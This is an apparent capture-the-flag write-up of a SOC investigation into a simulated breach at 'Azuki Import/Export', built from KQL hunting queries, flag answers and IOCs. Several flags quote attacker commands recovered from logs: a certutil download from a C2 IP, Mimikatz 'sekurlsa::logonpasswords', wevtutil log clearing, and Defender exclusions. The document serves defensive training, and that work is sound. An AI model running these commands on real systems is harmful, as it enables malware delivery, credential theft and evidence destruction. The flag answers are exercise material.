# 🔍 SOC Investigation: Azuki Import/Export — Corporate Espionage & Data Exfiltration

<div align="center">

![Status](https://img.shields.io/badge/Status-In%20Progress-yellow?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Microsoft%20Sentinel%20%2F%20MDE-0078D4?style=for-the-badge&logo=microsoft)
![Severity](https://img.shields.io/badge/Severity-CRITICAL-red?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-Corporate%20Espionage-8E44AD?style=for-the-badge)

</div>

---

## 📋 Incident Brief

> **Competitor undercut our 6-year shipping contract by exactly 3%.**
> Supplier contracts and pricing data appeared on underground forums shortly after.

| Field | Detail |
|---|---|
| **Case ID** | AZK-IR-2025-001 |
| **Date** | 2025-11-19 |
| **Compromised Device** | `AZUKI-SL` — IT Admin Workstation |
| **Company** | Azuki Import/Export Trading Co. 梓貿易株式会社 |
| **Industry** | Shipping Logistics — Japan / SE Asia |
| **Tools Used** | Microsoft Defender for Endpoint, Microsoft Sentinel, KQL Advanced Hunting |

---

## ⚔️ Attack Chain

```
[THREAT ACTOR] ──RDP──► [AZUKI-SL] ──► [DISCOVERY] ──► [STAGING] ──► [EXFILTRATION]
  88.97.178.12            T0: 18:36         File Access     Archive?      Underground Forum
```

### MITRE ATT&CK Coverage

| # | Tactic | Technique | Status |
|---|--------|-----------|--------|
| 1 | Initial Access | T1133 – External Remote Services | ✅ Confirmed |
| 1 | Initial Access | T1078 – Valid Accounts | ✅ Confirmed |
| 1 | Initial Access | T1078.002 – Domain Accounts | ✅ Confirmed |
| 2 | Discovery | T1018 – Remote System Discovery | ✅ Confirmed |
| 2 | Execution | T1059.003 – Windows Command Shell | ✅ Confirmed |
| 3 | Defence Evasion | T1036 – Masquerading | ✅ Confirmed |
| 3 | Defence Evasion | T1564 – Hide Artifacts | ✅ Confirmed |
| 3 | Collection | T1074 – Data Staged | ✅ Confirmed |
| 4 | Defence Evasion | T1562.001 – Disable or Modify Tools | ✅ Confirmed |
| 4 | Defence Evasion | T1112 – Modify Registry | ✅ Confirmed |
| 5 | Defence Evasion | T1562.001 – Disable or Modify Tools (Paths) | ✅ Confirmed |
| 6 | Execution | T1059.001 – PowerShell | ✅ Confirmed |
| 6 | Defence Evasion | T1218 – System Binary Proxy Execution | ✅ Confirmed |
| 6 | C2 | T1105 – Ingress Tool Transfer | ✅ Confirmed |
| 7 | Persistence | T1053.005 – Scheduled Task/Job | ✅ Confirmed |
| 8 | Persistence | T1053.005 – Executable Path Confirmed | ✅ Confirmed |
| 9 | Command & Control | T1071 – C2 beacon to 78.141.196.6 | ✅ Confirmed |
| 10 | Command & Control | T1071.001 – C2 over port 443 (HTTPS) | ✅ Confirmed |
| 11 | Credential Access | T1003 – OS Credential Dumping (mm.exe) | ✅ Confirmed |
| 12 | Credential Access | T1003.001 – LSASS Memory (sekurlsa::logonpasswords) | ✅ Confirmed |
| 13 | Collection | T1560.001 – export-data.zip created in WindowsCache | ✅ Confirmed |
| 14 | Exfiltration | T1567.002 – discord.com:443 (23s after archive) | ✅ Confirmed |
| 15 | Anti-Forensics | T1070.001 – Security/System/Application logs cleared | ✅ Confirmed |
| 16 | Persistence | T1136.001 – Backdoor account "support" created | ✅ Confirmed |
| 17 | Execution | T1059.001 – wupdate.ps1 master script confirmed | ✅ Confirmed |
| 18 | Lateral Movement | T1021.001 – RDP to 10.1.0.188 | ✅ Confirmed |
| 19 | Lateral Movement | T1021.001 – mstsc.exe to 10.1.0.188 | ✅ Confirmed |
| 20 | Lateral Movement | T1218 – mstsc.exe LOLBin confirmed | ✅ Confirmed |

---

## 🚩 Flags & Findings

### Flag 1 — Initial Access ✅

> **Question:** Remote Desktop Protocol connections leave network traces that identify the source of unauthorised access. Determining the origin helps with threat actor attribution and blocking ongoing attacks.

**KQL Query Used:**
```kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType == "LogonSuccess"
| where isnotempty( RemoteIP )
| project TimeGenerated, LogonType, RemoteIP
```

**Evidence:**

| Time (UTC) | Logon Type | Remote IP | Assessment |
|---|---|---|---|
| 2025-11-19 18:36:18 | Network | `88.97.178.12` | 🔴 **THREAT ACTOR** |
| 2025-11-19 18:36:21 | Unlock | `88.97.178.12` | 🔴 **Active Session Control** |
| 2025-11-19 19:21:34 | Network | `10.0.8.9` | 🟢 Internal |
| 2025-11-19 19:21:36 | RemoteInteractive | `10.0.8.9` | 🟢 Internal |

**Analysis:**
The external public IP `88.97.178.12` authenticated via RDP at **18:36:18 UTC** — this is confirmed **T0 (Time of Initial Access)**. The immediate `Unlock` event confirms the attacker took active control of the desktop session, not just a background authentication. The internal `10.0.8.9` activity followed later, likely representing IT incident response or lateral movement.

> ✅ **Answer:** `88.97.178.12`

---

<!-- FLAGS 2+ WILL BE ADDED AS INVESTIGATION PROGRESSES -->

### Flag 2 — Compromised User Account ✅

> **Question:** Identifying which credentials were compromised determines the scope of unauthorised access and guides remediation efforts including password resets and privilege reviews.

**KQL Query Used:**
```kql
// USer_Account Compromised
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType == "LogonSuccess"
| where RemoteIP == "88.97.178.12"
| project TimeGenerated, AccountName, LogonType, RemoteIP
```

**Evidence:**

| Time (UTC) | Account | Logon Type | Remote IP |
|---|---|---|---|
| 2025-11-19 18:36:18 | `kenji.sato` | Network | `88.97.178.12` |
| 2025-11-19 18:36:21 | `kenji.sato` | Unlock | `88.97.178.12` |

**Analysis:**
Both logon events from the threat actor's IP mapped to the same account — `kenji.sato`, the IT administrator. This is the highest-privilege account on AZUKI-SL. The attacker walked in with valid admin credentials and required zero privilege escalation. This points to prior credential theft — likely phishing, credential stuffing, or an insider leak. Every action on this machine from 18:36 UTC onwards under this account is attacker-controlled.

> ✅ **Answer:** `kenji.sato`

### Flag 3 — Network Reconnaissance ✅

> **Question:** Attackers enumerate network topology to identify lateral movement opportunities and high-value targets. Identify the command and argument used to enumerate network neighbours?

**KQL Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:36:00Z) .. datetime(2025-11-20T18:36:00Z))
| where ProcessCommandLine has_any ("arp", "nbtstat", "net view", "netstat", "ping", "ipconfig", "nslookup", "tracert", "net neighbor")
| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

**Evidence:**

| Account | Command | Launched Via | Significance |
|---|---|---|---|
| `kenji.sato` | `arp -a` | cmd.exe | ARP cache enumeration — maps all subnet neighbours |

**Analysis:**
The attacker used `arp -a` — a native Windows command that reads the ARP cache, instantly revealing all IP/MAC pairs of hosts the machine has recently talked to. This is a **Living-off-the-Land (LotL)** technique — no tools downloaded, nothing for AV to flag. For a 23-person company, this likely exposed file servers, accounting systems, and other workstations — all lateral movement targets.

**MITRE ATT&CK:** T1018 – Remote System Discovery | T1059.003 – Windows Command Shell

> ✅ **Answer:** `arp -a`

---

### Flag 4 — Defence Evasion: Malware Staging Directory ✅

> **Question:** Attackers establish staging locations to organise tools and stolen data. Identify the PRIMARY staging directory where malware was stored?

**KQL Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19T18:36:00Z) .. datetime(2025-11-20T00:00:00Z))
| where ActionType in ("FileCreated", "FileModified", "FileRenamed")
| where InitiatingProcessAccountName == "kenji.sato"
| project Timestamp, FileName, FolderPath, ActionType, InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence:**

| Staging Directory | Legitimacy | Evasion Purpose |
|---|---|---|
| `C:\ProgramData\WindowsCache` | ❌ FAKE — no such Windows folder | Mimics legitimate Windows component, hidden by default |

**Analysis:**
The attacker created `C:\ProgramData\WindowsCache` as their primary staging hub. The name is deliberately crafted to masquerade as a legitimate Windows system folder — Windows has no such native directory. `C:\ProgramData\` is hidden from standard Explorer view by default, non-user-specific (persists across sessions), and generates minimal EDR noise. This level of operational security points to an experienced threat actor who pre-planned their intrusion. All malware, tools, and stolen data likely passed through this directory.

**MITRE ATT&CK:** T1036 – Masquerading | T1564 – Hide Artifacts | T1074 – Data Staged

> ✅ **Answer:** `C:\ProgramData\WindowsCache`

### Flag 5 — Defence Evasion: Windows Defender Exclusions ✅

> **Question:** Attackers add file extension exclusions to Windows Defender to prevent scanning of malicious files. How many file extensions were excluded from Windows Defender scanning?

**KQL Query Used:**
```kql
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19T18:36:00Z) .. datetime(2025-11-20T00:00:00Z))
| where RegistryKey contains "Defender"
| where RegistryKey contains "Exclusion"
| project Timestamp, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
| order by Timestamp asc
```

**Evidence — Extension Exclusions (Answer = 3):**

| Time | Extension | Purpose |
|---|---|---|
| 12:49:27 | `.bat` | Batch scripts run without AV detection |
| 12:49:27 | `.ps1` | PowerShell scripts — primary attack tool |
| 12:49:29 | `.exe` | Malware executables run unscanned |

**Bonus Evidence — Full Defender Takedown:**

| Category | Value | Significance |
|---|---|---|
| Path | `C:\ProgramData\WindowsCache` | Staging directory — fully blind to Defender |
| Path | `C:\Users\kenji.sato\AppData\Local\Temp` | Temp folder execution path excluded |
| Process | `svchost.exe` | Masquerade as legitimate Windows service |
| Process | `mm.exe` | 🚨 Unknown binary — likely malware payload |
| IP Key | Created at 13:45 | Prepared to whitelist C2 server |

**Analysis:**
All exclusions were applied via `msmpeng.exe` (Defender's own engine) within a 2-second window — this was scripted and pre-planned. The attacker weaponised Defender against itself using admin privileges. `mm.exe` is not a known Windows binary and was explicitly excluded — **strongly suspected to be the primary malware payload**. Watch for this in upcoming flags.

**MITRE ATT&CK:** T1562.001 – Disable or Modify Tools | T1112 – Modify Registry

> ✅ **Answer:** `3`

---

### Flag 6 — Defence Evasion: Folder Path Exclusion ✅

> **Question:** Attackers add folder path exclusions to Windows Defender to prevent scanning of directories used for downloading and executing malicious tools. Which folder path was excluded?

**KQL Query Used:**
```kql
//Folder Exclusion
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:36:00Z) .. datetime(2025-11-20T00:00:00Z))
| where RegistryKey contains "Exclusions"
| project TimeGenerated, RegistryKey, RegistryValueName
| order by TimeGenerated asc
```

**Evidence:**

| Time (UTC) | Path Excluded | Significance |
|---|---|---|
| 2025-11-19 18:49:27 | `C:\Users\KENJI~1.SAT\AppData\Local\Temp` | Temp folder — high-noise execution path excluded from scanning |

**Analysis:**
The short path `KENJI~1.SAT` is Windows 8.3 legacy format — written by a script, not typed manually. The Temp folder is a prime attacker location because legitimate processes use it constantly, masking malicious activity. This exclusion was set just 13 minutes after initial access. Combined with Flag 5, the attacker achieved full Defender bypass rapidly:

| Stage | What Was Bypassed | Effect |
|---|---|---|
| Flag 5 | `.bat` `.ps1` `.exe` excluded | Any filetype runs unscanned |
| Flag 6 | Temp + WindowsCache paths excluded | Any location operates unscanned |
| **Result** | **Full Defender bypass achieved** | **Attacker operates with complete freedom** |

**MITRE ATT&CK:** T1562.001 – Disable or Modify Tools | T1112 – Modify Registry

> ✅ **Answer:** `C:\Users\KENJI~1.SAT\AppData\Local\Temp`

---

### Flag 7 — Defence Evasion: LOLBin Abuse (certutil.exe) ✅

> **Question:** Legitimate system utilities are weaponized to download malware while evading detection. Identify the Windows-native binary the attacker abused to download files?

**KQL Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19T18:36:00Z) .. datetime(2025-11-20T18:36:00Z))
| where AccountName != "system"
| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

**Evidence:**

| Field | Value |
|---|---|
| Time (UTC) | 2025-11-19 19:06:58 |
| Account | `kenji.sato` |
| Binary Abused | `certutil.exe` (LOLBin — Windows Certificate Utility) |
| Full Command | `certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe` |
| Initiated By | `powershell.exe` |
| PowerShell Script | `powershell.exe -ExecutionPolicy Bypass -File C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1` |

**Attack Download Chain:**
```
wupdate.ps1  →  powershell.exe -ExecutionPolicy Bypass
      ↓
certutil.exe -urlcache -f  (LOLBin downloader)
      ↓
http://78.141.196.6:8080  (C2 server)
      ↓
C:\ProgramData\WindowsCache\svchost.exe  (staged payload)
```

**Analysis:**
Every step connects to prior flags: Temp (Flag 6) hosted the script, WindowsCache (Flag 4) received the payload, .ps1 and .exe (Flag 5) ensured no scanning. This was fully pre-planned. New IOCs: C2 IP `78.141.196.6:8080`, script `wupdate.ps1`, payload `svchost.exe` in WindowsCache.

**MITRE ATT&CK:** T1218 – System Binary Proxy Execution | T1059.001 – PowerShell | T1105 – Ingress Tool Transfer

> ✅ **Answer:** `certutil.exe`

---

### Flag 8 — Persistence: Scheduled Task ✅

> **Question:** Identify the name of the scheduled task created for persistence?

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where ProcessCommandLine contains "schtasks"
| where AccountName != "system"
| project TimeGenerated, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```

| Field | Value |
|---|---|
| Task Name | `Windows Update Check` |
| Payload | `C:\ProgramData\WindowsCache\svchost.exe` |
| Schedule | Daily at 02:00 |
| Runs As | `SYSTEM` |

Task name mimics Windows maintenance. Runs malware as SYSTEM nightly — survives reboots.
**MITRE:** T1053.005 – Scheduled Task/Job

> ✅ **Answer:** `Windows Update Check`

---

### Flag 9 — Persistence: Scheduled Task Executable Path ✅

> **Question:** Identify the executable path configured in the scheduled task?

Same query as Flag 8 — expanding the result reveals the `/tr` argument.

| Field | Value |
|---|---|
| Task Name | `Windows Update Check` |
| Executable | `C:\ProgramData\WindowsCache\svchost.exe` |
| Initiated By | `wupdate.ps1` via PowerShell -ExecutionPolicy Bypass |

Confirms the Flag 7 downloaded payload is wired directly into the persistence mechanism.
**MITRE:** T1053.005 – Scheduled Task/Job

> ✅ **Answer:** `C:\ProgramData\WindowsCache\svchost.exe`

---

### Flag 10 — Command & Control: C2 Server Address ✅

> **Question:** Identify the IP address of the command and control server?

**KQL:**
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessFileName == "svchost.exe"
| where InitiatingProcessAccountName != "system"
| where ActionType == "ConnectionSuccess"
| project TimeGenerated, RemoteIP, InitiatingProcessCommandLine
```

| Time (UTC) | Remote IP | Process | Assessment |
|---|---|---|---|
| 19:11:04 | `78.141.196.6` | `"svchost.exe"` | 🔴 C2 — Malware |
| 19:44:46 | `72.155.5.152` | `svchost.exe -k NetworkService` | ✅ Legitimate |

Same IP as Flag 7 download server — confirms single C2 infrastructure. Malware beaconed 4 minutes after execution.
**MITRE:** T1071 – Application Layer Protocol

> ✅ **Answer:** `78.141.196.6`

---

### Flag 11 — Command & Control: C2 Port ✅

> **Question:** Identify the destination port used for C2 communications?

**KQL:**
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessFileName == "svchost.exe"
| where InitiatingProcessAccountName != "system"
| where ActionType == "ConnectionSuccess"
| where RemoteIP == "78.141.196.6"
| project TimeGenerated, RemoteIP, RemotePort
```

| Remote IP | Port | Protocol | Significance |
|---|---|---|---|
| `78.141.196.6` | `443` | HTTPS | C2 hidden in encrypted web traffic |

Port 443 is used by every website — attacker deliberately chose it to blend in. Blocking is impractical without SSL inspection.
**MITRE:** T1071.001 – Web Protocols | T1573 – Encrypted Channel

> ✅ **Answer:** `443`

---

### Flag 12 — Credential Access: Credential Dumping Tool ✅

> **Question:** Identify the filename of the credential dumping tool?

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName contains "kenji"
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by TimeGenerated asc
```

| Time (UTC) | File | Location | Launched By |
|---|---|---|---|
| 19:08:26 | `mm.exe` | `C:\ProgramData\WindowsCache` | `powershell.exe` |

Renamed Mimikatz — `mm` is a common abbreviation. Pre-excluded from Defender (Flag 5), pre-staged in WindowsCache (Flag 4). Launched 1 min after C2 beacon — remotely triggered.
**MITRE:** T1003 – OS Credential Dumping | T1036 – Masquerading

> ✅ **Answer:** `mm.exe`

---

### Flag 13 — Credential Access: Memory Extraction Module ✅

> **Question:** Identify the module used to extract logon passwords from memory?

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName contains "kenji"
| where FileName == "mm.exe"
| project TimeGenerated, FileName, ProcessCommandLine
```

**Full command:** `"mm.exe" privilege::debug sekurlsa::logonpasswords exit`

| Step | Command | Purpose |
|---|---|---|
| 1 | `privilege::debug` | Elevates to debug rights to access LSASS |
| 2 | `sekurlsa::logonpasswords` | Dumps passwords, NTLM hashes, Kerberos tickets |
| 3 | `exit` | Closes cleanly — minimises forensic footprint |

**MITRE:** T1003.001 – LSASS Memory

> ✅ **Answer:** `sekurlsa::logonpasswords`

---

### Flag 14 — Collection: Data Staging Archive ✅

> **Question:** Identify the compressed archive filename used for data exfiltration?

**KQL:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where ActionType == "FileCreated"
| where FileName has_any (".zip", ".rar", ".7z")
| where InitiatingProcessAccountName contains "kenji"
| project TimeGenerated, FolderPath, InitiatingProcessFileName, AdditionalFields
| order by TimeGenerated asc
```

| Time (UTC) | Full Path | Created By | Type |
|---|---|---|---|
| 19:08:58 | `C:\ProgramData\WindowsCache\export-data.zip` | `powershell.exe` | Zip |

Created 32 seconds after Mimikatz ran. Stored in Defender-excluded staging directory.
**MITRE:** T1074.001 – Local Data Staging | T1560.001 – Archive via Utility

> ✅ **Answer:** `export-data.zip`

---

### Flag 15 — Exfiltration: Cloud Service Channel ✅

> **Question:** Identify the cloud service used to exfiltrate stolen data?

**KQL:**
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where ActionType == "ConnectionSuccess"
| project TimeGenerated, RemoteUrl, RemoteIP, RemotePort
```

| Time (UTC) | Remote URL | Remote IP | Port |
|---|---|---|---|
| 19:09:21 | `discord.com` | `162.159.135.232` | `443` |
| 19:09:21 | `discord.com` | `127.0.0.1` | `52288` (localhost relay) |

export-data.zip created at 19:08:58 → exfiltrated via Discord at 19:09:21 — **23 seconds later**. Discord webhooks allow anonymous file upload over HTTPS, bypassing all standard firewall controls.
**MITRE:** T1567.002 – Exfiltration to Cloud Storage

> ✅ **Answer:** `discord`

---

### Flag 16 — Anti-Forensics: Log Tampering ✅

> **Question:** Identify the first Windows event log cleared by the attacker?

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName contains "kenji"
| project TimeGenerated, FileName, ProcessCommandLine
| order by TimeGenerated asc
```

| Time (UTC) | Command | Log | Note |
|---|---|---|---|
| 19:11:39 | `wevtutil.exe cl Security` | **Security** | 🔴 First — logons, RDP, privileges |
| 19:11:43 | `wevtutil.exe cl System` | System | Service/crash records |
| 19:11:46 | `wevtutil.exe cl Application` | Application | App events |

All 3 logs cleared in 7 seconds. Security cleared first — most incriminating. Highlights why SIEM telemetry matters beyond local logs.
**MITRE:** T1070.001 – Clear Windows Event Logs

> ✅ **Answer:** `Security`

---

### Flag 17 — Persistence: Backdoor Account ✅

> **Question:** Identify the backdoor account username created by the attacker?

**KQL:**
```kql
DeviceEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName contains "kenji"
| where ActionType == "UserAccountCreated"
| project TimeGenerated, ActionType, AccountName
```

| Time (UTC) | Action | Account |
|---|---|---|
| 19:09:48 | `UserAccountCreated` | `support` |

Created after exfiltration (19:09:21) and before log clearing (19:11:39). Name mimics IT helpdesk — invisible in casual review.
**MITRE:** T1136.001 – Create Local Account

> ✅ **Answer:** `support`

---

### Flag 18 — Execution: Master Attack Script ✅

> **Question:** Identify the PowerShell script used to automate the attack chain?

**KQL:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where ActionType == "FileCreated"
| where FileName has_any (".ps1")
| where InitiatingProcessAccountName contains "kenji"
| project TimeGenerated, FolderPath, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

| Field | Value |
|---|---|
| Script | `wupdate.ps1` |
| Path | `C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1` |
| Execution | `powershell.exe -ExecutionPolicy Bypass -File ...wupdate.ps1` |

Master orchestrator for the entire kill chain — certutil (F7), schtasks (F8), mm.exe (F12), export-data.zip (F14), backdoor account (F17), log clearing (F16).
**MITRE:** T1059.001 – PowerShell | T1036 – Masquerading

> ✅ **Answer:** `wupdate.ps1`

---

### Flag 19 — Lateral Movement: Secondary Target ✅

> **Question:** What IP address was targeted for lateral movement?

**KQL:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName != "system"
| where FileName contains "mstsc"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
```

| Time (UTC) | Command | Target | Initiated By |
|---|---|---|---|
| 19:10:41 | `mstsc.exe /v:10.1.0.188` | `10.1.0.188` | `wupdate.ps1` |

Internal LAN pivot using stolen Mimikatz credentials. Same RDP technique as initial access. Also automated by wupdate.ps1.
**MITRE:** T1021.001 – Remote Desktop Protocol

> ✅ **Answer:** `10.1.0.188`

---

### Flag 20 — Lateral Movement: Remote Access Tool ✅

> **Question:** Identify the remote access tool used for lateral movement?

Same query as Flag 19 — the filename answers this flag.

| Tool | Command | Full Name |
|---|---|---|
| `mstsc.exe` | `mstsc.exe /v:10.1.0.188` | Microsoft Terminal Services Client (Windows RDP) |

Native Windows binary — never flagged by AV, traffic identical to legitimate admin use. Initiated by `wupdate.ps1`. Full LOLBin lateral movement with zero custom tools.
**MITRE:** T1021.001 – Remote Desktop Protocol | T1218 – System Binary Proxy Execution

> ✅ **Answer:** `mstsc.exe`

---

## 🏁 Investigation Complete — All 20 Flags Resolved

## 💻 KQL Reference Queries

<details>
<summary>🔐 Logon Analysis</summary>

```kql
// All successful remote logons
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ActionType == "LogonSuccess"
| where isnotempty(RemoteIP)
| project TimeGenerated, AccountName, AccountDomain, LogonType, RemoteIP
```

</details>

<details>
<summary>⚙️ Process Execution (Post-Compromise)</summary>

```kql
// All processes launched after T0
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19T18:36:00Z)
| project Timestamp, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp asc
```

</details>

<details>
<summary>🌐 Network Activity (Exfiltration Hunt)</summary>

```kql
// Outbound connections excluding internal IP
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19T18:36:00Z)
| where RemoteIP != "10.0.8.9"
| project Timestamp, RemoteIP, RemoteUrl, RemotePort, InitiatingProcessFileName
| order by Timestamp asc
```

</details>

<details>
<summary>📁 File Access & Staging</summary>

```kql
// Files accessed / created after initial compromise
DeviceFileEvents
| where DeviceName == "azuki-sl"
| where Timestamp >= datetime(2025-11-19T18:36:00Z)
| project Timestamp, AccountName, FileName, FolderPath, ActionType, InitiatingProcessFileName
| order by Timestamp asc
```

</details>

---

## 🛡️ Key Indicators of Compromise (IOCs)

| Type | Value | Context |
|---|---|---|
| IP Address | `88.97.178.12` | Threat actor RDP source — T0 entry point |
| Username | `kenji.sato` | Compromised IT admin account |
| Command | `arp -a` | Network neighbour enumeration (LotL) |
| Directory | `C:\ProgramData\WindowsCache` | Fake staging directory — masquerading as Windows component |
| Process | `mm.exe` | Suspicious unknown binary — likely malware payload |
| Registry | `Defender\Exclusions\Extensions` | 3 extensions excluded: .bat .ps1 .exe |
| Registry | `Defender\Exclusions\Paths` | Temp folder path excluded from scanning |

*Additional IOCs will be added as investigation progresses.*

---

## 📝 Lessons Learned

> *(To be completed at end of investigation)*

- [ ] RDP should never be exposed directly to the internet
- [ ] Strong MFA on all remote access accounts
- [ ] Geo-blocking / conditional access policies
- [ ] Alert on first-time external IP logons

---

## 📂 Repository Structure

```
azuki-soc-investigation/
├── README.md                          ← This file (live case overview)
├── report/
│   └── Azuki_SOC_Investigation_Report.docx  ← Full detailed report
├── screenshots/
│   ├── flag1_initial_access.png
│   └── ...                            ← Add screenshots per flag
└── queries/
    ├── logon_analysis.kql
    ├── process_execution.kql
    ├── network_activity.kql
    └── file_events.kql
```

---

## 🧰 Tools & Skills Demonstrated

![KQL](https://img.shields.io/badge/KQL-Advanced%20Hunting-0078D4?style=flat-square&logo=microsoft)
![MDE](https://img.shields.io/badge/Microsoft%20Defender-Endpoint-00A4EF?style=flat-square&logo=microsoft)
![Sentinel](https://img.shields.io/badge/Microsoft-Sentinel-0089D6?style=flat-square&logo=microsoft)
![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-E63946?style=flat-square)
![IR](https://img.shields.io/badge/Incident-Response-2ECC71?style=flat-square)

---

<div align="center">
<sub>CTF Exercise | TLP:WHITE | Investigation In Progress</sub>
</div>
